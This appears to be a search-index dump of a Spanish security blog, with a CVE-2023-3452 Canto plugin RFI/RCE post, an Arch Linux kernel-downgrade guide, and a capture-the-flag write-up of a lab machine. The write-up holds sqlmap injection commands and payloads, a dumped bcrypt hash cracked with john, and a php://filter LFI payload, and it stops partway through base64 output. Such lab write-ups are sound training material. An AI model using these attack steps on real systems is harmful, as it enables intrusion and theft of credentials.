[{"content":"En este PoC veremos una Inclusión Remota de Ficheros No Autenticada (RFI) y Ejecución Remota de Código No Autenticada (RCE) que afecta a Canto en versiones anteriores a la 3.0.5.\nWhat is Canto? Canto es un plugin de código abierto, un software de gestión de activos digitales que organiza archivos y multimedia para empresas.\nProof Of Content Esta vulnerabilidad afecta al parámetro wp_abspath que se encuentra en la siguiente línea de includes/lib/download.php:\n*** require_once($_REQUEST[\u0026#39;wp_abspath\u0026#39;] . \u0026#39;/wp-admin/admin.php\u0026#39;); ***\rTambién debe estar habilitado en php.ini el allow_url_include:\nVamos a enviar una petición GET a un servidor python que he abierto en el puerto 8881:\nPodemos ver que hemos recibido de la petición GET a nuestro servidor python, podemos ver que la llamada se realiza desde /wp-admin/admin.php , ahora en lugar de querer enviarnos una petición vamos a intentar ejecutar un comando:\nExploit Repositorio\rScript en python automatizado para el PoC del CVE-2023-3452\nCTF con CVE-2023-3452 He creado una máquina con esta vulnerabilidad por si la quereís tocar, la máquina está en la plataforma HackMyVM:\nhttps://hackmyvm.eu/machines/machine.php?vm=Canto\n","date":"2025-06-15","id":0,"permalink":"/blog/cve-2023-3452-remote-file-inclusion-remote-code-execution-unauthenticated/","summary":"En este PoC veremos una Inclusión Remota de Ficheros No Autenticada (RFI) y Ejecución Remota de Código No Autenticada (RCE) que afecta a Canto en versiones anteriores a la 3.","tags":["CVE-2023-3452","RFI","RCE","Unauthenticated"],"title":"CVE-2023-3452 - Remote File Inclusion - Remote Code Execution - Unauthenticated"},{"content":"En algunos casos al actualizar tu Arch Linux puede que veas una actualización del kernel. Previamente instalamos los drivers NVIDIA en nuestro sistema donde los compilamos al kernel anterior, al actualizar el kernel puede que tus drivers no sean compatibles con el nuevo kernel. Hay posibilidades de arreglarlo pero lo más fácil y factible es volver al kernel anterior donde los drivers funcionaban correctamente.\nPacman cache Para ver la cache de pacman podemos hacer un ls al directorio /var/cache/pacman/pkg y si tenemos suerte y no hemos borrado la cache al actualizar podemos encontrar el paquete del kernel anterior donde funcionaban los drivers NVIDIA:\n❯ ls /var/cache/pacman/pkg/ | grep linux-zen linux-zen-6.11.6.zen1-1-x86_64.pkg.tar.zst linux-zen-6.11.6.zen1-1-x86_64.pkg.tar.zst.sig linux-zen-6.12.1.zen1-1-x86_64.pkg.tar.zst linux-zen-6.12.1.zen1-1-x86_64.pkg.tar.zst.sig linux-zen-headers-6.11.6.zen1-1-x86_64.pkg.tar.zst linux-zen-headers-6.11.6.zen1-1-x86_64.pkg.tar.zst.sig linux-zen-headers-6.12.1.zen1-1-x86_64.pkg.tar.zst linux-zen-headers-6.12.1.zen1-1-x86_64.pkg.tar.zst.sig\rEn mi caso donde ha funcionado es en la 6.11.6 por lo que podemos seguir los pasos de la Wiki de Arch:\nhttps://wiki.archlinux.org/title/Downgrading_packages Downgrade Si no podemos encontrar el kernel anterior donde funcionaban los drivers usaremos una herramienta llamada Downgrade.\nComparto el repositorio:\nhttps://github.com/archlinux-downgrade/downgrade Si tenemos yay podremos instalarlo fácilmente:\nyay -S downgrade\rSi no tenemos yay podemos instalarlo, os comparto el repositorio donde explica su instalación:\nhttps://github.com/Jguer/yay?tab=readme-ov-file#installation Una vez instalado el downgrade pondremos el siguiente comando buscando el kernel que usamos (en mi caso linux-zen):\nsudo downgrade linux-zen\rAhora buscaremos la versión de kernel que tuvimos antes y le daremos a Enter y empezará a instalarse.\nCaution\nRECUERDA: Tendrás que desinstalar linux-headers o linux-zen-headers dependiendo de cual estés usando e instalarlos también con el mismo comando downgrade pero buscando linux-zen-headers.\n","date":"2025-06-15","id":1,"permalink":"/blog/los-drivers-de-nvidia-no-compilan-correctamente-en-arch-linux/","summary":"En algunos casos al actualizar tu Arch Linux puede que veas una actualización del kernel. Previamente instalamos los drivers NVIDIA en nuestro sistema donde los compilamos al kernel anterior, al actualizar el kernel puede que tus drivers no sean compatibles con el nuevo kernel.","tags":["Arch Linux","Nvidia"],"title":"Los drivers de NVIDIA no compilan correctamente en Arch Linux"},{"content":"","date":"2023-09-07","id":2,"permalink":"/blog/","summary":"","tags":[],"title":"Blog"},{"content":"","date":"2023-09-07","id":3,"permalink":"/writeups/hackmyvm/","summary":"","tags":[],"title":"DOCKERLABS"},{"content":"","date":"2023-09-07","id":4,"permalink":"/challenges/hackmyvm/","summary":"","tags":[],"title":"HACKMYVM"},{"content":"","date":"2023-09-07","id":5,"permalink":"/writeups/dockerlabs/","summary":"","tags":[],"title":"HACKMYVM"},{"content":"","date":"2023-09-07","id":6,"permalink":"/challenges/hackthebox/","summary":"","tags":[],"title":"HACKTHEBOX"},{"content":"","date":"2023-09-07","id":7,"permalink":"/writeups/hackthebox/","summary":"","tags":[],"title":"HACKTHEBOX"},{"content":"","date":"2023-09-07","id":8,"permalink":"/writeups/thehackerslabs/","summary":"","tags":[],"title":"THEHACKERSLABS"},{"content":"","date":"2023-09-07","id":9,"permalink":"/writeups/vulnhub/","summary":"","tags":[],"title":"VULNHUB"},{"content":"Enumeration Vamos a empezar con un escaneo nmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ nmap -p- --open -sS -n -Pn --min-rate=5000 -vvv 192.168.44.133 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 13:16 CEST Initiating ARP Ping Scan at 13:16 Scanning 192.168.44.133 [1 port] Completed ARP Ping Scan at 13:16, 0.04s elapsed (1 total hosts) Initiating SYN Stealth Scan at 13:16 Scanning 192.168.44.133 [65535 ports] Discovered open port 22/tcp on 192.168.44.133 Discovered open port 3306/tcp on 192.168.44.133 Discovered open port 80/tcp on 192.168.44.133 Discovered open port 21/tcp on 192.168.44.133 Completed SYN Stealth Scan at 13:16, 0.70s elapsed (65535 total ports) Nmap scan report for 192.168.44.133 Host is up, received arp-response (0.00067s latency). Scanned at 2025-07-20 13:16:17 CEST for 1s Not shown: 65531 closed tcp ports (reset) PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 64 22/tcp open ssh syn-ack ttl 64 80/tcp open http syn-ack ttl 64 3306/tcp open mysql syn-ack ttl 64 MAC Address: 00:0C:29:79:B9:22 (VMware) Read data files from: /usr/share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)\rVemos que tiene varios puertos abiertos, vamos a realizar un segundo escaneo para determinar el servicio y versión que corre en el puerto:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ nmap -p21,22,80,3306 -sCV 192.168.44.133 Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 15:34 CEST Nmap scan report for 192.168.44.133 Host is up (0.00013s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0) | ssh-hostkey: | 256 f7:c5:4a:ca:73:0e:21:ed:9f:5d:7e:35:65:f6:9f:b2 (ECDSA) |_ 256 fc:f2:e9:1a:ae:3c:da:94:f5:db:11:b2:8b:5c:7f:32 (ED25519) 80/tcp open http Apache httpd 2.4.62 |_http-title: Did not follow redirect to http://hillvalley.thl/ |_http-server-header: Apache/2.4.62 (Debian) 3306/tcp open mysql MariaDB 10.3.23 or earlier (unauthorized) MAC Address: 00:0C:29:79:B9:22 (VMware) Service Info: Host: _default_; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds\rVemos que tiene un dominio configurado hillvalley.thl', vamos a añadirlo en nuestro /etc/hosts`:\n192.168.44.133 hillvalley.thl\rVamos a ver la aplicación web:\nVemos que hay un login, antes de probar cualquier cosa vamos a realizar un fuzzing para ver si hay más cosas en la aplicación:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u \u0026#34;http://hillvalley.thl/FUZZ\u0026#34; -e .php,.html,.txt,.js /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://hillvalley.thl/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt :: Extensions : .php .html .txt .js :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ index.php [Status: 200, Size: 2948, Words: 656, Lines: 69, Duration: 3ms] about.php [Status: 200, Size: 240, Words: 26, Lines: 3, Duration: 0ms] img [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms] admin.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms] css [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms] js [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms] config.php [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1ms] logs.php [Status: 200, Size: 216, Words: 22, Lines: 6, Duration: 0ms] .php [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms] .html [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms] [Status: 200, Size: 2948, Words: 656, Lines: 69, Duration: 6ms] server-status [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms] time_machine.php [Status: 200, Size: 1121, Words: 134, Lines: 29, Duration: 10ms]\rVemos que hay varios archivos, vamos a ir viendolos:\nabout.php\rlogs.php\rVemos que no hay gran cosa, nos habla con que fin fue creada esta aplicación web.\nVemos unos logs, donde lo siguiente me llama la atención:\n[ERROR] 1985-10-26 01:21: Backup fallido: permiso denegado [INFO] 1985-10-25 23:59: Modificado archivo config.php\rNos guardaremos está información si no encontramos nada por el login.\nShell as www-data Vamos a ver si el login es vulnerable a un SQLi para ello lo detectaremos de la siguiente manera:\nInterceptaremos la consulta con BurpSuite y la enviaremos al Repeater: Vamos a probar en el campo username a añadir una comilla simple, si esto está mal sanitizado por detrás lo que ocurrirá es un fallo en la consulta devolviendo un error o un código de estádo 500: Esto nos da una buena señal, ya que estamos ocasionando un error en la consulta. Ahora vamos a emplear sqlmap para ver ante que posible tipo de SQLi nos podriamos estar enfrentando:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ sqlmap -u \u0026#34;http://hillvalley.thl/\u0026#34; --data=\u0026#34;username=test\u0026amp;password=test\u0026#34; --batch ___ __H__ ___ ___[)]_____ ___ ___ {1.9.6#stable} |_ -| . [(] | .\u0026#39;| . | |___|_ [)]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 15:47:32 /2025-07-20/ [15:47:32] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [15:47:32] [INFO] testing connection to the target URL [15:47:32] [WARNING] potential permission problems detected (\u0026#39;Access denied\u0026#39;) you have not declared cookie(s), while server wants to set its own (\u0026#39;PHPSESSID=bj2l9mr4c4l...ulr9f6h11u\u0026#39;). Do you want to use those [Y/n] Y sqlmap resumed the following injection point(s) from stored session: --- Parameter: username (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=test\u0026#39; AND (SELECT 9578 FROM (SELECT(SLEEP(5)))ctfH) AND \u0026#39;YLkb\u0026#39;=\u0026#39;YLkb\u0026amp;password=test --- [15:47:32] [INFO] the back-end DBMS is MySQL web server operating system: Linux Debian web application technology: Apache 2.4.62, PHP back-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork) [15:47:32] [INFO] fetched data logged to text files under \u0026#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl\u0026#39; [*] ending @ 15:47:32 /2025-07-20/\rVemos que estamos ante un Blind SQLi Time Based. Vamos a enumerar las bases de datos con sqlmap:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ sqlmap -u \u0026#34;http://hillvalley.thl/\u0026#34; --data=\u0026#34;username=test\u0026amp;password=test\u0026#34; --dbs --batch ___ __H__ ___ ___[\u0026#34;]_____ ___ ___ {1.9.6#stable} |_ -| . [\u0026#34;] | .\u0026#39;| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 15:49:12 /2025-07-20/ [15:49:12] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [15:49:12] [INFO] testing connection to the target URL [15:49:12] [WARNING] potential permission problems detected (\u0026#39;Access denied\u0026#39;) you have not declared cookie(s), while server wants to set its own (\u0026#39;PHPSESSID=5vche9cjoeb...qucaibmv4r\u0026#39;). Do you want to use those [Y/n] Y sqlmap resumed the following injection point(s) from stored session: --- Parameter: username (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=test\u0026#39; AND (SELECT 9578 FROM (SELECT(SLEEP(5)))ctfH) AND \u0026#39;YLkb\u0026#39;=\u0026#39;YLkb\u0026amp;password=test --- [15:49:12] [INFO] the back-end DBMS is MySQL web server operating system: Linux Debian web application technology: PHP, Apache 2.4.62 back-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork) [15:49:12] [INFO] fetching database names [15:49:12] [INFO] fetching number of databases [15:49:12] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done) [15:49:12] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions do you want sqlmap to try to optimize value(s) for DBMS delay responses (option \u0026#39;--time-sec\u0026#39;)? [Y/n] Y 2 [15:49:22] [INFO] retrieved: [15:49:27] [INFO] adjusting time delay to 1 second due to good response times information_schema [15:50:24] [INFO] retrieved: hillvalley available databases [2]: [*] hillvalley [*] information_schema [15:50:57] [INFO] fetched data logged to text files under \u0026#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl\u0026#39; [*] ending @ 15:50:57 /2025-07-20/\rAviso\nPuede tardar un rato en enumerarnos todas las bases de datos ya que al ser basada en tiempo tiene que ir letra en letra, solo debemos esperar.\nVemos la base de datos hillvalley, ahora con el parametro -D indicaremos esa base de datos y enumeraremos las tablas:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ sqlmap -u \u0026#34;http://hillvalley.thl/\u0026#34; --data=\u0026#34;username=test\u0026amp;password=test\u0026#34; -D \u0026#34;hillvalley\u0026#34; --tables --batch ___ __H__ ___ ___[(]_____ ___ ___ {1.9.6#stable} |_ -| . [)] | .\u0026#39;| . | |___|_ [\u0026#39;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 15:52:47 /2025-07-20/ [15:52:47] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [15:52:47] [INFO] testing connection to the target URL [15:52:47] [WARNING] potential permission problems detected (\u0026#39;Access denied\u0026#39;) you have not declared cookie(s), while server wants to set its own (\u0026#39;PHPSESSID=hld44ufvdvp...9fjji60r01\u0026#39;). Do you want to use those [Y/n] Y sqlmap resumed the following injection point(s) from stored session: --- Parameter: username (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=test\u0026#39; AND (SELECT 9578 FROM (SELECT(SLEEP(5)))ctfH) AND \u0026#39;YLkb\u0026#39;=\u0026#39;YLkb\u0026amp;password=test --- [15:52:47] [INFO] the back-end DBMS is MySQL web server operating system: Linux Debian web application technology: Apache 2.4.62, PHP back-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork) [15:52:47] [INFO] fetching tables for database: \u0026#39;hillvalley\u0026#39; [15:52:47] [INFO] fetching number of tables for database \u0026#39;hillvalley\u0026#39; [15:52:47] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done) [15:52:47] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions do you want sqlmap to try to optimize value(s) for DBMS delay responses (option \u0026#39;--time-sec\u0026#39;)? [Y/n] Y 1 [15:52:52] [INFO] retrieved: [15:53:02] [INFO] adjusting time delay to 1 second due to good response times users Database: hillvalley [1 table] +-------+ | users | +-------+ [15:53:15] [INFO] fetched data logged to text files under \u0026#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl\u0026#39; [*] ending @ 15:53:15 /2025-07-20/\rYa tenemos la tabla!! Ahora vamos a enumerar las columnas. Indicaremos la tabla encontrada con -T:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ sqlmap -u \u0026#34;http://hillvalley.thl/\u0026#34; --data=\u0026#34;username=test\u0026amp;password=test\u0026#34; -D \u0026#34;hillvalley\u0026#34; -T \u0026#34;users\u0026#34; --columns --batch ___ __H__ ___ ___[)]_____ ___ ___ {1.9.6#stable} |_ -| . [(] | .\u0026#39;| . | |___|_ [\u0026#39;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 15:54:50 /2025-07-20/ [15:54:50] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [15:54:50] [INFO] testing connection to the target URL [15:54:50] [WARNING] potential permission problems detected (\u0026#39;Access denied\u0026#39;) you have not declared cookie(s), while server wants to set its own (\u0026#39;PHPSESSID=eanuvdsvr7p...8te4c584d9\u0026#39;). Do you want to use those [Y/n] Y sqlmap resumed the following injection point(s) from stored session: --- Parameter: username (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=test\u0026#39; AND (SELECT 9578 FROM (SELECT(SLEEP(5)))ctfH) AND \u0026#39;YLkb\u0026#39;=\u0026#39;YLkb\u0026amp;password=test --- [15:54:50] [INFO] the back-end DBMS is MySQL web server operating system: Linux Debian web application technology: PHP, Apache 2.4.62 back-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork) [15:54:50] [INFO] fetching columns for table \u0026#39;users\u0026#39; in database \u0026#39;hillvalley\u0026#39; [15:54:50] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done) [15:54:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions do you want sqlmap to try to optimize value(s) for DBMS delay responses (option \u0026#39;--time-sec\u0026#39;)? [Y/n] Y [15:55:06] [INFO] adjusting time delay to 1 second due to good response times 3 [15:55:06] [INFO] retrieved: id [15:55:12] [INFO] retrieved: int(11) [15:55:37] [INFO] retrieved: username [15:55:59] [INFO] retrieved: varchar(50) [15:56:32] [INFO] retrieved: password [15:56:59] [INFO] retrieved: varchar(320) Database: hillvalley Table: users [3 columns] +----------+--------------+ | Column | Type | +----------+--------------+ | id | int(11) | | password | varchar(320) | | username | varchar(50) | +----------+--------------+ [15:57:34] [INFO] fetched data logged to text files under \u0026#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl\u0026#39; [*] ending @ 15:57:34 /2025-07-20/\rAviso\nPuede tardar un rato. La paciencia da el resultado, jeje.\nYa tenemos las columnas, vamos a dumpearnos los datos:\n┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ sqlmap -u \u0026#34;http://hillvalley.thl/\u0026#34; --data=\u0026#34;username=test\u0026amp;password=test\u0026#34; -D \u0026#34;hillvalley\u0026#34; -T \u0026#34;users\u0026#34; -C \u0026#34;username, password\u0026#34; --dump --batch ___ __H__ ___ ___[)]_____ ___ ___ {1.9.6#stable} |_ -| . [(] | .\u0026#39;| . | |___|_ [,]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user\u0026#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 15:59:21 /2025-07-20/ [15:59:21] [INFO] resuming back-end DBMS \u0026#39;mysql\u0026#39; [15:59:21] [INFO] testing connection to the target URL [15:59:21] [WARNING] potential permission problems detected (\u0026#39;Access denied\u0026#39;) you have not declared cookie(s), while server wants to set its own (\u0026#39;PHPSESSID=4e1k1f9625g...7iff656cko\u0026#39;). Do you want to use those [Y/n] Y sqlmap resumed the following injection point(s) from stored session: --- Parameter: username (POST) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=test\u0026#39; AND (SELECT 9578 FROM (SELECT(SLEEP(5)))ctfH) AND \u0026#39;YLkb\u0026#39;=\u0026#39;YLkb\u0026amp;password=test --- [15:59:21] [INFO] the back-end DBMS is MySQL web server operating system: Linux Debian web application technology: PHP, Apache 2.4.62 back-end DBMS: MySQL \u0026gt;= 5.0.12 (MariaDB fork) [15:59:21] [INFO] fetching entries of column(s) \u0026#39;password,username\u0026#39; for table \u0026#39;users\u0026#39; in database \u0026#39;hillvalley\u0026#39; [15:59:21] [INFO] fetching number of column(s) \u0026#39;password,username\u0026#39; entries for table \u0026#39;users\u0026#39; in database \u0026#39;hillvalley\u0026#39; [15:59:21] [INFO] resumed: 1 [15:59:21] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done) [15:59:21] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions do you want sqlmap to try to optimize value(s) for DBMS delay responses (option \u0026#39;--time-sec\u0026#39;)? [Y/n] Y [15:59:36] [INFO] adjusting time delay to 1 second due to good response times $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy [16:03:28] [INFO] retrieved: marty Database: hillvalley Table: users [1 entry] +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | marty | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | +----------+--------------------------------------------------------------+ [16:03:43] [INFO] table \u0026#39;hillvalley.users\u0026#39; dumped to CSV file \u0026#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl/dump/hillvalley/users.csv\u0026#39; [16:03:43] [INFO] fetched data logged to text files under \u0026#39;/home/pylon/.local/share/sqlmap/output/hillvalley.thl\u0026#39; [*] ending @ 16:03:43 /2025-07-20/\rTenemos su hash, vamos a emplear john:\n┌──(pylon㉿kali)-[~/Desktop/pylon/THL/BackToTheFuture] └─$ john -w=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status andromeda (?) 1g 0:00:00:14 DONE (2025-07-20 16:07) 0.06978g/s 261.2p/s 261.2c/s 261.2C/s benji..street Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed.\rBien!! Ya tenemos la contraseña del usuario marty. Vamos a probarlas en el login:\nMoviendome por la aplicación web me percato de lo siguiente:\nEsto huele a un posible LFI vamos a probar poniendo simplemente /etc/passwd:\nVamos a ver si podemos usar PHP Wrappers:\n`Payload\rphp://filter/convert.base64-encode/resource=admin.php\rVemos que pudimos emplearlo, vamos a descodificar la cadena base64:\nCadena base64\radmin.php\rPD9waHANCmluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQppZiAoIWlzc2V0KCRfU0VTU0lPTlsnbG9nZ2VkX2luJ10pIHx8ICRfU0VTU0lPTlsnbG9nZ2VkX2luJ10gIT09IHRydWUpIHsNCiAgICBoZWFkZXIoIkxvY2F0aW9uOiBpbmRleC5waHAiKTsNCiAgICBleGl0Ow0KfQ0KPz4NCg0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJlbiI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgDQogICAgPCEtLSBTZSBkaWNlIHF1ZSBlbCBEZUxvcmVhbiBndWFyZGEgc2VjcmV0b3Mgc2kgaW5zcGVjY2lvbsOhcyBiaWVuIC0tPg0KICAgIDx0aXRsZT5IaWxsIFZhbGxleSBBZG1pbiBQYW5lbDwvdGl0bGU+DQogICAgPHN0eWxlPg0KICAgICAgICBib2R5IHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMwZTBlMWE7DQogICAgICAgICAgICBjb2xvcjogIzAwZmZjYzsNCiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiAnQ291cmllciBOZXcnLCBDb3VyaWVyLCBtb25vc3BhY2U7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGgyIHsNCiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDFyZW07DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHAgew0KICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogLjVyZW07DQogICAgICAgIH0NCg0KICAgICAgICAuY29udGFpbmVyIHsNCiAgICAgICAgICAgIHdpZHRoOiA5MCU7DQogICAgICAgICAgICBtYXJnaW46IDJyZW0gYXV0bzsNCiAgICAgICAgfQ0KDQogICAgICAgIC5uYXYgew0KICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMS41cmVtOw0KICAgICAgICAgICAgZGlzcGxheTogZmxleDsNCiAgICAgICAgfQ0KICAgICAgICAubmF2IGEgew0KICAgICAgICAgICAgY29sb3I6ICMwMGZmZmY7DQogICAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7DQogICAgICAgICAgICBtYXJnaW4tcmlnaHQ6IDFyZW07DQogICAgICAgICAgICBwYWRkaW5nOiAuNXJlbSAwOw0KICAgICAgICAgICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkICMwMGZmZmY7DQogICAgICAgIH0NCg0KICAgICAgICAudGVybWluYWwgew0KICAgICAgICAgICAgYmFja2dyb3VuZDogIzAwMDAwMDsNCiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICMwMGZmY2M7DQogICAgICAgICAgICBwYWRkaW5nOiAxcmVtOw0KICAgICAgICAgICAgdGV4dC13cmFwOiB3cmFwOw0KICAgICAgICAgICAgd29yZC13cmFwOiB3cmFwOw0KICAgICAgICAgICAgb3ZlcmZsb3c6IGhpZGRlbjsNCiAgICAgICAgICAgIG92ZXJmbG93LXdyYXA6IGJyZWFrLXdvcmQ7DQogICAgICAgICAgICBkaXNwbGF5OiBmbGV4Ow0KICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsNCiAgICAgICAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOw0KICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsNCiAgICAgICAgfQ0KDQogICAgICAgIC5pbWcgew0KICAgICAgICAgICAgd2lkdGg6IDEwMCU7DQogICAgICAgICAgICBtYXgtd2lkdGg6IDUwMHB4Ow0KICAgICAgICAgICAgZGlzcGxheTogYmxvY2s7DQogICAgICAgICAgICBtYXJnaW46IDAgYXV0bzsNCiAgICAgICAgfQ0KDQogICAgICAgIEBtZWRpYSAobWF4LXdpZHRoOiA3NjhweCkgew0KICAgICAgICAgICAgLnRpbWUtcm93IHsNCiAgICAgICAgICAgICAgICBncmlkLXRlbXBsYXRlLWNvbHVtbnM6IHJlcGVhdCg2LCBhdXRvKTsNCiAgICAgICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLnRpbWUtcm93IC5jYXB0aW9uIHsNCiAgICAgICAgICAgICAgICBmb250LXNpemU6IDAuOXJlbTsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgLmNoYXIgew0KICAgICAgICAgICAgICAgIGZvbnQtc2l6ZTogMS4zcmVtOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBoMSB7DQogICAgICAgICAgICAgICAgZm9udC1zaXplOiAycmVtOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAuZGVsb3JlYW4tcGFuZWwgew0KICAgICAgICAgICAgICAgIHBhZGRpbmc6IDFyZW07DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAuZmx1eC1jYXJkIHsNCiAgICAgICAgICAgIGJhY2tncm91bmQ6ICMxMTE7DQogICAgICAgICAgICBtYXgtd2lkdGg6IDcwMHB4Ow0KICAgICAgICAgICAgbWFyZ2luOiBhdXRvOw0KICAgICAgICAgICAgcGFkZGluZzogMnJlbTsNCiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDEycHg7DQogICAgICAgICAgICBib3gtc2hhZG93O